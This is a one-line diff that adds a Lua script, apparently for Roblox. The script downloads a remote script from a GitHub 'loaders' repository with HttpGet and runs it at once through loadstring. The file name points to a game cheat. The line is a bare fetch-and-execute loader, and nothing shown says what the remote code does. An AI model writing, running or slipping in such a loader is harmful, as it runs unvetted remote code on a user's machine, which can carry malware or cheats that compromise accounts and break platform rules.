@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/fps-flick-spam0-3wo1tsokntqf0u.lua"))()
